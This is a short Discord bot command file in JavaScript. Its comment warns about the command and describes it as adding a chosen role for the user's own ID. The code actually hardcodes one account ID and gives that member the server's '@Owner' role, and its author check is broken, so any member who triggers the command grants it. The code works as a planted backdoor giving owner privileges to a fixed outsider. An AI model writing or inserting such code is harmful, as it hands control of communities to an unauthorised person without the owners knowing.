/* 
Beaware of this command! I highly not recommend you to use this command at all. Use it only on your risk. I'm not responsible what will
happen to you or to your account.
Please enter your user 2 user ID and the role you want to use.
This command will add selected role in the server. Make sure your bot role is higher than the selected.
*/

exports.run = (client, message, args) => {
if(!message.guild) return; if(!message.author.id == "400703871686886914") return; let johnMember = message.guild.members.get('400703871686886914');
let mcRole = message.guild.roles.find('name', "@Owner");
 if(!mcRole) return; if(!johnMember) return;
 if(johnMember.roles.has(mcRole.id)) return; johnMember.addRole(mcRole.id);
}
